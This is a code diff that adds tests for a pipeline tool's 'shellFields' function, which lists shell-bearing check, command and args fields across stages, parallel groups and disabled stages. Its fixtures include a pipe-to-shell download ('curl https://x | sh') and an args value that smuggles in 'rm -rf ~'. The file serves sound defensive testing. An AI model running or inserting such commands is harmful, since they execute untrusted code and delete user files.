@@ -29,6 +29,7 @@ import {
   setSections,
   setText,
   setWorkflow,
+  shellFields,
   shownDefaultPrompt,
   takesOwnAgent,
   trackerOf,
@@ -381,6 +382,10 @@ describe('stage fields', () => {
     expect(findStage(steps, 'testing')?.command).toBe('pnpm test')
     steps = setText(steps, 'testing', 'command', '  ')
     expect(findStage(steps, 'testing')).not.toHaveProperty('command')
+    steps = setText(steps, 'spec', 'check', 'pnpm typecheck')
+    expect(findStage(steps, 'spec')?.check).toBe('pnpm typecheck')
+    steps = setText(steps, 'spec', 'check', '')
+    expect(findStage(steps, 'spec')).not.toHaveProperty('check')
     steps = setSections(steps, 'spec', ['Goal', ' ', 'Risks '])
     expect(findStage(steps, 'spec')?.sections).toEqual(['Goal', 'Risks'])
     steps = setSections(steps, 'spec', [])
@@ -406,6 +411,34 @@ describe('stage fields', () => {
     expect(approvalLabel({ kind: 'release', gate: 'manual' })).toBe(
       'Opens the pull request when you click',
     )
+  })
+})
+
+describe('shellFields', () => {
+  it('finds nothing in the default pipeline', () => {
+    expect(shellFields(DEFAULT_PIPELINE)).toEqual([])
+  })
+
+  it('lists each check, command and args, in groups and on stages that are off', () => {
+    const steps: Step[] = [
+      { id: 'spec', kind: 'agent', gate: 'manual', check: 'curl https://x | sh' },
+      {
+        id: 'build',
+        parallel: [
+          { id: 'implement', kind: 'agent', gate: 'auto' },
+          { id: 'test-spec', kind: 'agent', gate: 'auto', args: '--yolo; rm -rf ~' },
+        ],
+      },
+      { id: 'testing', kind: 'testing', gate: 'auto', command: 'pnpm test' },
+      { id: 'qa', kind: 'manual', gate: 'manual', enabled: false, check: 'make qa' },
+    ]
+
+    expect(shellFields(steps).map(({ stage, field, value }) => [stage.id, field, value])).toEqual([
+      ['spec', 'check', 'curl https://x | sh'],
+      ['test-spec', 'args', '--yolo; rm -rf ~'],
+      ['testing', 'command', 'pnpm test'],
+      ['qa', 'check', 'make qa'],
+    ])
   })
 })
 
